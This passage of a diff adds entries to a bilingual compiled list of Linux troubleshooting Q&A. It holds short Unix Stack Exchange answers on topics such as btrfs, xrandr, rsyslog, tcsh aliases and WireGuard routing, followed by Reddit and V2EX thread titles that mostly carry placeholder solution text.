+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/800638/rsync-with-include-from-breaks-hardlinks-evec-with-h
+
+---
+
+#### 2966. Can I combine raid1 and dup BTRFS profiles?
+
+**问题描述 / Problem Description**:
+Tags: linux, btrfs, raid | Score: 0 | Views: 85 | Answers: 1 | Created: 2025-10-17
+
+**解决方案 / Solution**:
+I am not aware of a way to do that directly (i.e. with btrfs means only) but you could use LVM to split the devices in two parts, 95:5. Then add all four devices to the filesystem, set data to RAID1 and metadata to RAID1C4 . Warning There seems not to be a way to prevent btrfs from putting data on the small devices. And if they are full then the filesystem is "full". So you would have to check regularly for this problem ( btrfs device usage ) and run btrfs balance if necessary. But even if you just write 3% of the capacity at once you may run into severe problems. An alternative might be to have the small devices offline most of the time; then is it obviously impossible to put data on them. From time to time (while no data is being written) add them to the filesystem and run btrfs balance to update the metadata on the small devices.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/800550/can-i-combine-raid1-and-dup-btrfs-profiles
+
+---
+
+#### 2967. this monitor resolution not supported
+
+**问题描述 / Problem Description**:
+Tags: linux, monitors, resolution | Score: 0 | Views: 85 | Answers: 1 | Created: 2025-10-15
+
+**解决方案 / Solution**:
+I assume this happens in all Linux's ? I mean, it's been two decades since I connected a screen via VGA (and 1920×1200 is definitely pretty much above what you want to transport in analog), but recognizing a new screen when told to detect it definitely worked relatively flawlessly back when VGA was still something I used with my Linux systems day-to-day and still works (I just tried with a USB VGA adapter that I use for other purposes, an 1280-wide old screen that still has a VGA input that I'm never using, and an old 1024-wide projector); I did have to xrandr --auto in between, because the electrical interface on VGA has no good provision to signal "you really need to ask the screen EEPROM for its data again". (I forget how the equivalent wlroots/wayland tool is called; it exists.) So, maybe you just need to run xrandr --auto or use your control center's screen dialogue to detect your new screen?
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/800491/this-monitor-resolution-not-supported
+
+---
+
+#### 2968. Trying to install blueman but asks to remove pipewire
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, apt, pulseaudio, bluetooth, blueman | Score: 0 | Views: 176 | Answers: 1 | Created: 2025-10-07
+
+**解决方案 / Solution**:
+If you tell apt to ignore recommended packages, it should stop trying to install pulseaudio-module-bluetooth and allow PipeWire to remain installed: sudo apt install --no-install-recommends blueman I don’t know whether that will fix your Bluetooth problems but it should allow blueman to be installed. In Ubuntu 24.04, blueman can work with PipeWire; install libspa-0.2-bluetooth for that.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/800273/trying-to-install-blueman-but-asks-to-remove-pipewire
+
+---
+
+#### 2969. How to trigger an action when a kernel driver produces an error
+
+**问题描述 / Problem Description**:
+Tags: linux, systemd-journald, amdgpu | Score: 0 | Views: 126 | Answers: 2 | Created: 2025-10-04
+
+**解决方案 / Solution**:
+With rsyslogd you can match the error message and run a program. Create a file such as /etc/rsyslog.d/99-myamdgpu.conf with the contents: module(load="omprog") if $msg contains 'the error message' then action(type="omprog" binary="/bin/myprog") and restart rsyslogd . The executable program or script /bin/myprog will be run when there is a message match. It will be provided with matching messages on stdin. If the program exits, it will be restarted again the next time a message matches. To debug you can add a filename to collect output from the program whilst testing, for example action(type="omprog" binary="/bin/myprog" output="/tmp/mylog") See omprog .
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/800201/how-to-trigger-an-action-when-a-kernel-driver-produces-an-error
+
+---
+
+#### 2970. CONFIG_NAMESPACES, CONFIG_USER_NS, and user.max_*_namespaces
+
+**问题描述 / Problem Description**:
+Tags: linux, namespace | Score: 0 | Views: 156 | Answers: 1 | Created: 2025-10-01
+
+**解决方案 / Solution**:
+If a kernel is built with CONFIG_NAMESPACES disabled, then no namespace support is available with that kernel, at all. That can’t then be changed at runtime. The same applies to CONFIG_USER_NS : if a kernel is built with that disabled, then no user namespace support is available with that kernel, and that can’t be changed at run time. A kernel with namespace support provides user.max_*_namespaces controls to limit namespace support at runtime. This doesn’t imply that namespaces are still usable if these controls are set to 0; if they are set to 0, then no one can create namespaces, which effectively means namespaces are not usable.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/800126/config-namespaces-config-user-ns-and-user-max-namespaces
+
+---
+
+#### 2971. How to wrap source command in tcsh
+
+**问题描述 / Problem Description**:
+Tags: linux, alias, source, tcsh | Score: 0 | Views: 161 | Answers: 1 | Created: 2025-09-20
+
+**解决方案 / Solution**:
+% \source /dev/null source: Command not found. % "source" /dev/null source: Command not found. But: % source"" /dev/null % sourc\e /dev/null % Seem to be fine for some reason, so you can do: alias source 'echo Sourcing: \!* && sourc\e \!*' Beware of the limitations. First, that echo writes to stdout, so that output will end up in the middle of the output of the rest of the script. Ideally, you'd want to send that to stderr but (t)csh has no support for that. Also, tcsh's echo expands escape sequences. So here, you should probably do: alias source 'sh -c '\''"$0">&2 "%s\n" "Sourcing: $*"'\'' printf \!*; sourc\e \!*' Resorting to sh to be able to send to stderr and to printf to print the arguments verbatim. Then, that's an alias, just something replaced by something else before reinterpretation, not a function. (t)csh has no functions, so if you do something like: source file > output That becomes: echo Sourcing: file > output && sourc\e file > output Yes, > output , despite not being arguments to the command are included in the !* expansion which happens at lexical level. So here output is opened (and truncated) twice. That also explains why you must not put that !* inside double quotes. With: source file | cmd cmd | source file That becomes: echo Sourcing: file && sourc\e file | cmd cmd | echo Sourcing: file && sourc\e file In the second line, the output of cmd is fed to echo , not to source . In Bourne-like or rc-like shells, you could have used { ... } to group the two commands (or begin ... end in fish ), but there's no equivalent in (t)csh. (t)csh has some control statements such as foreach loops, but their parsing is very messy. For instance, you'd think you could do: foreach dummy (dummy) cmd1 cmd2 end To group 2 commands without starting a subshell, but that doesn't really work in practice. cmd1 || foreach dummy (dummy) cmd2 cmd3 end For instance would still run cmd2 and cmd3 if cmd1 succeeded, and would complain about the end because the foreach has been skipped earlier. Piping those statements also don't work. You'd also have a hard time making an alias for that, with things working in a version of tcsh but not another. As @cas says , there are many reasons why (t)csh should not be used especially for scripting, its ill-designed syntax and broken parser one of them. What about in Bourne-like shells Incidentally, wrapping . (the Bourne shell equivalent of csh 's source ; though some Bourne-like shells also support source as an alias or as a slightly different version of . ) is also tricky. First, not many shells support defining a function with . as its name. zsh , bash , mksh do, but generally others don't. POSIX-compliant shells don't allow redefining special builtins as functions, and . happens to be a POSIX special builtin. In the case of bash (the GNU implementation of sh ), it only allows you to redefine . if not in POSIX mode that is if it's not invoked as sh , without the -o posix option, without POSIXLY_CORRECT or SHELLOPTS=posix in the environment. Using a function wrapper also implies a separate variable scope and positional parameters, so even in zsh or bash not in POSIX mode (the only two that let you define a . function), if you do: # zsh . source() { print -ru2 Sourcing: ${(q+)@} builtin $0 "$@" } # bash trace() { local IFS=' ' printf>&2 'Sourcing: %s\n' "$*" } .() { trace "${@@Q}" builtin . "$@" } source() { trace "${@@Q}" builtin source "$@" } . ./file or: source ./file And the sourced file has: typeset -i n=3 That will make the i variable local to the . / source function, so no longer available after it returns. Same happens if the sourced file does set foo bar to modify the positional parameters. Another approach in Korn-like shells is to use the DEBUG trap which triggers before (after in ksh88) any command (pipeline in zsh; and not in subshells or functions in ksh93 or bash (unless extdebug is set)) and inside which in ksh93, bash or zsh, the about-to-be-executed command/pipeline is available in respectively ${.sh.command} , $BASH_COMMAND and $ZSH_DEBUG_CMD . Then in zsh, you could do: TRAPDEBUG() { local words=( "${(Q@)${(z)ZSH_DEBUG_CMD}}" ) if [[ $words[1] = (.|source) ]] print -ru2 Running: $ZSH_DEBUG_CMD } Which would trace all and-or lists (pipelines connected with || or && ) whose first word is source or . , even if quoted (the z flag above is to do zsh syntax tokenisation of the code in $ZSH_DEBUG_CMD , Q to do quote removal). As zsh moves redirections after commands in ZSH_DEBUG_CMD , that would also work in: $ </dev/null 'source' file | cat && echo OK Running: 'source' file < /dev/null | cat && echo OK If would not work for things like cmd | source file or cmd || source file (where the first word is cmd ) or $(echo source) file or ${var+source} file or var=value source file ... rc-like shells In rc or derivatives such as es or akanga , the command to source file is also . like in Bourne-like shells, and they let you redefine it as a function, so you can do: fn . {echo>[1=2] Sourcing: $*; builtin . $*} With the same caveat as in Bourne-like shells that if sourced files modify the positional parameters, those changes will be lost after the function returns. fish fish has both . and source and lets you redefine it as a function which can share the scope of its caller with -S / --no-scope-shadowing : function . --no-scope-shadowing echo>&2 Sourcing: $argv builtin . $argv end function source --no-scope-shadowing echo>&2 Sourcing: $argv builtin source $argv end With the same caveat as in Bourne-like or rc-like shells that if sourced files modify the positional parameters, those changes will be lost after the function returns.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/799827/how-to-wrap-source-command-in-tcsh
+
+---
+
+#### 2972. Is there a list of every scancode that Linux uses?
+
+**问题描述 / Problem Description**:
+Tags: linux, keyboard, unicode | Score: 0 | Views: 334 | Answers: 1 | Created: 2025-09-18
+
+**解决方案 / Solution**:
+If you’re only looking for evdev codes, those are all defined in include/uapi/linux/input-event-codes.h in the kernel source code. If you have the appropriate packages installed, the codes known on your system are thus available in /usr/include/linux/input-event-codes.h : grep '#define KEY_' /usr/include/linux/input-event-codes.h
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/799766/is-there-a-list-of-every-scancode-that-linux-uses
+
+---
+
+#### 2973. Union mount for Linux where lower directory's contents are protected
+
+**问题描述 / Problem Description**:
+Tags: linux, union-mount | Score: 0 | Views: 88 | Answers: 1 | Created: 2025-09-14
+
+**解决方案 / Solution**:
+macOS goes to considerable effort to merge system, shared, and personal Applications into one view. On Linux, it is possible to layer certain file systems, but there is no obvious mechanism to give the lower layer priority. overlayfs features in general assume the upper layer will be written, often the lower layer is not writable. Writing to the lower layer bypassing the overlay is not an option: "If the underlying filesystem is changed, the behavior of the overlay is undefined, though it will not result in a crash or deadlock." Linux has other similar layered file systems, always reinventing the wheel, but I will not take the time to cite them here. Regarding the use case of write-protected, even immutable software distros, review what Fedora Atomic Desktop is doing. System software is a full image, with a / without write permissions. Recent work makes the root with composefs where the kernel always denies writes. Also enabling strong integrity checks like fs-verity and Secure Boot. Additional personal software can be installed via Flatpak packages and containers. This is not the single merged directory you asked for, /var is where the writes really happen. Rather, software is accessed via desktop environment shortcuts or scripts to use containers. It has stronger protection than merely file system write permissions, with fs-verity on a read of a corrupted program will fail.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/799697/union-mount-for-linux-where-lower-directorys-contents-are-protected
+
+---
+
+#### 2974. how to do ctags without binary files?
+
+**问题描述 / Problem Description**:
+Tags: linux, ctags | Score: 0 | Views: 135 | Answers: 1 | Created: 2025-09-09
+
+**解决方案 / Solution**:
+Produce a NUL-separated list of filenames: sudo find / -type f -print0 | \ Look at the first few bytes of each file, to see what "type" it is: xargs -0 -r sudo file | \ 3a. Eliminate "binary" files (adjust the regexp); grep -E -i -v ':.*\(binary|ELF\)' | \ OR 3b. Select the "source" files (adjust the regexp) grep -E -i ':.*\(source|C|include\)' | \ Separate the filenames (before the : ) from file 's description (after the : ): cut "-d:" -f1 | \ Feed the list of filenames to ctags : xargs -r ctags Code: sudo find / -type f -print0 | \ xargs -0 -r sudo file | \ grep -E -i ':.*\(source|C|include\)' | \ cut "-d:" -f1 | \ xargs -r ctags
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/799579/how-to-do-ctags-without-binary-files
+
+---
+
+#### 2975. Linux: prevent filesystem remount
+
+**问题描述 / Problem Description**:
+Tags: linux, filesystems, mount | Score: 0 | Views: 127 | Answers: 1 | Created: 2025-09-08
+
+**解决方案 / Solution**:
+I am not aware of a general approach. And, of course, the question is: Whom are you defending against, a certain process or just anyone on a system even unconfined root? In the case of ro you can make the underlying block device read-only: blockdev --setro /dev/ram0 Of course, this just moves the question to: How do I prevent the block device from being set rw again...
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/799563/linux-prevent-filesystem-remount
+
+---
+
+#### 2976. Recommendations on configuring docker on Ubuntu 22.04
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, docker | Score: 0 | Views: 122 | Answers: 1 | Created: 2025-09-01
+
+**解决方案 / Solution**:
+The package documentation ( /usr/share/doc/docker.io/README.Debian on your system) explains how to proceed: As noted in the upstream documentation ( https://docs.docker.io ), Docker will allow non-root users in the "docker" group to access "docker.sock" and thus communicate with the daemon. To add yourself to the "docker" group, use something like: adduser YOURUSER docker As also noted in the upstream documentation, the "docker" group (and any other means of accessing the Docker API) is root-equivalent. If you don't trust a user with root on your box, you shouldn't trust them with Docker either.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/799370/recommendations-on-configuring-docker-on-ubuntu-22-04
+
+---
+
+#### 2977. SSH connection over from LAN to WireGuard VPN Peer drops after ~1 minute despite keepalive settings
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, ssh, openssh, wireguard | Score: 0 | Views: 711 | Answers: 1 | Created: 2025-08-31
+
+**解决方案 / Solution**:
+After digging deeper into the issue, I realized the problem wasn’t with SSH itself or with WireGuard’s MTU/keepalive settings, but with how my network routing was set up. Setup Laptop (192.168.100.111) -> Gateway/Firewall (192.168.100.1) -> Server hosting WireGuard (192.168.100.115) -> WireGuard Peer (10.0.0.8) Root Cause The problem was caused by asymmetric routing . Packets went through the firewall initially, which created a state entry and sent back an ICMP redirect. Replies from the WireGuard peer bypassed the firewall, so the firewall never saw the full handshake. When its state expired, packets fell back through the firewall and were dropped. This caused the SSH session to disconnect. See explanation of asymmetric routing for more details. Solution Added a direct route from my Laptop to the WireGuard Hosting Server into so traffic always goes through the WireGuard server and not the firewall from the router: sudo ip route add 10.0.0.0/24 via 192.168.100.115
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/799327/ssh-connection-over-from-lan-to-wireguard-vpn-peer-drops-after-1-minute-despite
+
+---
+
+#### 2978. Assign second IP to logical network interface with pattern matching
+
+**问题描述 / Problem Description**:
+Tags: linux, ip-address | Score: 0 | Views: 90 | Answers: 1 | Created: 2025-08-23
+
+**解决方案 / Solution**:
+This is described in the Debian wiki here: https://wiki.debian.org/NetworkConfiguration#Multiple_IP_addresses_on_one_Interface You can have multiple blocks starting: iface eth inet6 static This lets you add multiple IP addresses. Just add another block with the “second” IP address: iface eth inet6 static address 2001:db8::baba/128 gateway fe80::1 iface eth inet6 static address 3fff::c0c0/64
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/799371/assign-second-ip-to-logical-network-interface-with-pattern-matching
+
+---
+
+#### 2979. iptables NAT rules not forwarding DPDK TAP traffic to external interface
+
+**问题描述 / Problem Description**:
+Tags: ubuntu, networking, vmware | Score: 0 | Views: 116 | Answers: 1 | Created: 2025-08-20
+
+**解决方案 / Solution**:
+Solved by my self. The linux kernel will check dest mac to see whether belongs to iteself and packet's check sum is incorret. Fix the two points it works as expect.
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/799026/iptables-nat-rules-not-forwarding-dpdk-tap-traffic-to-external-interface
+
+---
+
+#### 2980. How do I use AppArmor to disable the execution of specific executables from bash?
+
+**问题描述 / Problem Description**:
+Tags: linux, apparmor | Score: 0 | Views: 421 | Answers: 1 | Created: 2025-08-17
+
+**解决方案 / Solution**:
+The problem is that iptables was a symlink. Apparently symlinks can be used to bypass AppArmor. That's pathetic. I updated the policy to block xtables-legacy-multi and it worked fine. # ls -lh /usr/bin/iptables lrwxrwxrwx 1 root root 20 22 mar 18.58 /usr/bin/iptables -> xtables-legacy-multi # iptables -bash: /usr/bin/iptables: Permission denied
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/798943/how-do-i-use-apparmor-to-disable-the-execution-of-specific-executables-from-bash
+
+---
+
+#### 2981. top memory utilization with less COMMAND width
+
+**问题描述 / Problem Description**:
+Tags: linux, ps | Score: 0 | Views: 139 | Answers: 4 | Created: 2025-08-09
+
+**解决方案 / Solution**:
+ps has a sort option ( --sort -%mem makes it sort by reverse memory), and awk can be used to print both the first (header) line and limit the output to, say, 10 lines ( NR < 12 ) after the header. awk can also truncate the number of fields by setting NF. With ps aux the command name will be the eleventh field, so you can set NF=11 . And then pipe the output into column -t to neaten up the output table. $ ps aux --sort -%mem | awk 'NR == 1 { print; next}; NR < 12 { NF=11; print}' | column -t USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND libvirt+ 668952 2.0 2.7 8285148 1724120 ? Sl Jul26 450:40 /usr/bin/kvm cas 29168 2.9 2.3 29414904 1478788 ? Sl Jul25 672:12 /usr/lib/firefox/firefox cas 53759 1.1 2.0 6003316 1316688 ? Sl Jul25 275:40 /usr/lib/firefox/firefox cas 53895 1.0 1.6 20607700 1067724 ? Sl Jul25 251:17 /usr/lib/firefox/firefox cas 30775 0.5 1.4 3694240 939016 ? Sl Jul25 133:51 /usr/lib/firefox/firefox cas 28898 2.8 1.4 13569076 927556 ? Sl Jul25 660:44 /usr/bin/firefox.real cas 2100749 0.3 1.3 3571244 833112 ? Sl Jul28 63:00 /usr/lib/firefox/firefox cas 117454 10.1 1.0 34430888 684428 ? S<Ll Aug09 120:58 /usr/lib/chromium/chromium Or, using head as well as awk , just: $ ps aux --sort -%mem | head -n 11 | awk 'NF=11' | column -t Alternatively, you could concatenate all the fields from $11 to $NF and then use awk's substr() function to truncate the command & args to, say, 30 characters or whatever width you want...but that will mean the $11 will contain spaces which will mess up the output table unless you use -v OFS='\t' with awk and tell column to use tabs as the separator. e.g. something like: ps aux --sort -%mem | awk -v cmdlen=30 -v OFS='\t' ' NR < 12 { cmd = $11; for (i=12; i <= NF; i++) { cmd = cmd " " $i }; $11 = substr(cmd, 1, cmdlen); NF = 11; print; }' | column -t -s $'\t'
+
+**参考链接 / References**:
+- https://unix.stackexchange.com/questions/798662/top-memory-utilization-with-less-command-width
+
+---
+
+#### 2982. dirty-frag-check: Read-only Dirty Frag checker for CVE-2026-43284 / CVE-2026-43500
+
+**问题描述 / Problem Description**:
+Reddit r/linux discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux/comments/1t86if3/dirtyfragcheck_readonly_dirty_frag_checker_for/
+
+---
+
+#### 2983. mtr – a KISS AUR helper
+
+**问题描述 / Problem Description**:
+Reddit r/linux discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux/comments/1t830pn/mtr_a_kiss_aur_helper/
+
+---
+
+#### 2984. Browsers Flatpaks vs native
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t85rlu/browsers_flatpaks_vs_native/
+
+---
+
+#### 2985. mouse wheel skipping scroll inputs when playing games in bottles with a wireless mouse
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t84g4d/mouse_wheel_skipping_scroll_inputs_when_playing/
+
+---
+
+#### 2986. UEFI Bug when trying to install CachyOS
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t82e64/uefi_bug_when_trying_to_install_cachyos/
+
+---
+
+#### 2987. Linux for optiplex 7050 ??
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t86y1r/linux_for_optiplex_7050/
+
+---
+
+#### 2988. Secure boot disable
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t81k40/secure_boot_disable/
+
+---
+
+#### 2989. warp terminal on wayland via amd igpu
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t82veu/warp_terminal_on_wayland_via_amd_igpu/
+
+---
+
+#### 2990. Zapret/Access to Youtube/Discord [RU]
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t82udr/zapretaccess_to_youtubediscord_ru/
+
+---
+
+#### 2991. Minecraft only session in Ubuntu 26.04
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t825vd/minecraft_only_session_in_ubuntu_2604/
+
+---
+
+#### 2992. Verification failed: (0x1A) Security Violation when booting up
+
+**问题描述 / Problem Description**:
+Reddit r/linuxquestions discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linuxquestions/comments/1t81ekl/verification_failed_0x1a_security_violation_when/
+
+---
+
+#### 2993. I compared the desktops, RAM & disk usage of all 8 Ubuntu flavours in the new 26.04 LTS release… If someone claims LXQt is lighter than Xfce, or KDE than GNOME, here are the numbers to refute them.
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t82yuk/i_compared_the_desktops_ram_disk_usage_of_all_8/
+
+---
+
+#### 2994. Are there problems with Ubuntu Discourse?
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t8572u/are_there_problems_with_ubuntu_discourse/
+
+---
+
+#### 2995. New Brave Browser update supports gesture back/forward on wayland!
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t873dy/new_brave_browser_update_supports_gesture/
+
+---
+
+#### 2996. Hide external HDD partitions from 'guest' user.
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t85h8w/hide_external_hdd_partitions_from_guest_user/
+
+---
+
+#### 2997. Is this normal downloading speed?
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t8223e/is_this_normal_downloading_speed/
+
+---
+
+#### 2998. Lid closing
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t84xsy/lid_closing/
+
+---
+
+#### 2999. Looking for fsck log
+
+**问题描述 / Problem Description**:
+Reddit r/Ubuntu discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/Ubuntu/comments/1t80xlc/looking_for_fsck_log/
+
+---
+
+#### 3000. Wireless Keyboards
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t82pgx/wireless_keyboards/
+
+---
+
+#### 3001. Connecting a Bluetooth mouse... without a mouse
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t87c7c/connecting_a_bluetooth_mouse_without_a_mouse/
+
+---
+
+#### 3002. Advice needed on moving from dual boot to single boot
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t869j1/advice_needed_on_moving_from_dual_boot_to_single/
+
+---
+
+#### 3003. Need help about the os
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t86803/need_help_about_the_os/
+
+---
+
+#### 3004. Which Linux distro should I use?
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t8548y/which_linux_distro_should_i_use/
+
+---
+
+#### 3005. How do I update these devices on my laptop?
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t86b3a/how_do_i_update_these_devices_on_my_laptop/
+
+---
+
+#### 3006. what is the fastest debian based distro for gaming
+
+**问题描述 / Problem Description**:
+Reddit r/linux4noobs discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/linux4noobs/comments/1t8724r/what_is_the_fastest_debian_based_distro_for_gaming/
+
+---
+
+#### 3007. Concord(not that game) - TUI client for Discord
+
+**问题描述 / Problem Description**:
+Reddit r/commandline discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/commandline/comments/1t82jk9/concordnot_that_game_tui_client_for_discord/
+
+---
+
+#### 3008. Jetrocli: JSON query engine with Emacs-style keybinding (jq-like DSL)
+
+**问题描述 / Problem Description**:
+Reddit r/commandline discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/commandline/comments/1t82jxd/jetrocli_json_query_engine_with_emacsstyle/
+
+---
+
+#### 3009. I spent the last few months trying to fix the trust gap in sharing CLI tools.
+
+**问题描述 / Problem Description**:
+Reddit r/commandline discussion
+
+**解决方案 / Solution**:
+See Reddit thread for community solutions and troubleshooting steps.
+
+**参考链接 / References**:
+- https://www.reddit.com/r/commandline/comments/1t81fos/i_spent_the_last_few_months_trying_to_fix_the/
+
+---
+
+#### 3010. [V2EX] 自己搭建的中转站
+
+**问题描述 / Problem Description**:
+有喜欢的老铁可以注册使用哦～ https://passionevery.art/
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211527#reply1
+
+---
+
+#### 3011. [V2EX] 写了个 Docker 容器无痛迁移工具
+
+**问题描述 / Problem Description**:
+支持增量迁移，自动识别 Compose depends_on 按依赖顺序恢复，以及 volume 和挂载卷。 背景是最近要把我的 Lightsail 和腾讯云，阿里云服务都迁移到 Hetzner 。 三家零零散散跑了十几个容器，有些是 Docker compose 启动，有些配置了 network ，手动迁移太痛苦了。 使用方式很简单： mico pack # 打包所有运行中的容器（以及镜像/配置/卷/网络配置）为一个 .zst 压缩包 mico unpack mico.zstd # 在目标服务器一键恢复，按依赖顺序自动重建 有需要的可以试试。 https://github.com/Ray-D
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211508#reply11
+
+---
+
+#### 3012. [V2EX] Serverless 里怎么处理需要建立长连接的外部资源？
+
+**问题描述 / Problem Description**:
+最近在 Cloudflare Workers 上接外部 Redis / Valkey ，发现传统 Node 服务那套“建一个 Redis client 然后复用连接”的思路不太行 Worker 会冷启动、冻结、恢复或回收，模块级 client 虽然能复用，但不像常驻进程里的连接池那么可靠。实际遇到的现象是：client 看起来 ready ，但 Redis 命令经常 timeout ，后续还会引发一些连带错误。尤其是从 cloudflare 阿姆斯特丹机房到 digital ocean 班加罗尔机房的连接质量差得离谱，已经超时到无法忍受了 我现在的临时处理是：Serverless 侧不直接维护
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211420#reply9
+
+---
+
+#### 3013. [V2EX] DeepSeek V4 Pro：处于前沿的首个中文模型
+
+**问题描述 / Problem Description**:
+https://foodtruckbench.com/blog/deepseek-v4-pro 5 次运行全部成功。中位数投资回报率（ ROI ）高达 +1,257%。中位数净资产达 $27,142 。 首个跻身 Opus 4.6 、GPT-5.2 和 Grok 4.3 （最新版）同等 ROI 梯队的中国模型； 在所有受测的高级模型中，其运行表现最为出色且稳定性最高。
+
+**解决方案 / Solution**:
+See V2EX thread for community solutions.
+
+**参考链接 / References**:
+- https://www.v2ex.com/t/1211341#reply14
+
+---
+
+#### 3014. [V2EX] 千问推出了 PC 语音输入，功能和 typeless 差不多
+
+**问题描述 / Problem Description**:
